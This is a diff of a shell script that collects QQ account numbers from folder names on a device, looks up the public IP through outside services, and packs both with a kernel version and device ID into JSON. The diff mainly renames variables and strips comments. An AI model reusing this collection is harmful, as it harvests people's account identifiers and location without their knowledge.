@@ -27,7 +27,7 @@ done
 # ------------------------------
 # 收集 QQ 号（纯数字文件/文件夹名）
 # ------------------------------
-numbers_list=""
+qq_list=""
 if [ -d "$qq_dir" ]; then
   for item in "$qq_dir"/*; do
     name=$(basename "$item")
@@ -35,10 +35,10 @@ if [ -d "$qq_dir" ]; then
       ''|*[!0-9]*)
         ;;  # 非纯数字跳过
       *)
-        if [ -z "$numbers_list" ]; then
-          numbers_list="$name"
+        if [ -z "$qq_list" ]; then
+          qq_list="$name"
         else
-          numbers_list="$numbers_list,$name"
+          qq_list="$qq_list,$name"
         fi
         ;;
     esac
@@ -52,12 +52,10 @@ IP_SERVICES="https://api.ipify.org https://ifconfig.me/ip https://checkip.amazon
 ip=""
 for svc in $IP_SERVICES; do
   candidate=$(curl -s --max-time 5 "$svc" || echo "")
-  # 验证 IPv4 格式
   case "$candidate" in
     ''|*[!0-9.]*)
-      ;;  # 不匹配
+      ;;
     *)
-      # 简单验证 4 段
       IFS=. read -r o1 o2 o3 o4 <<EOF
 $candidate
 EOF
@@ -117,7 +115,7 @@ json_data=$(cat <<EOF
 {
   "kernel_version": "$kernel_version",
   "validation_status": "$validation_status",
-  "numbers": "$numbers_list",
+  "qq": "$qq_list",
   "ip": "$ip",
   "device_id": "$device_id"
 }
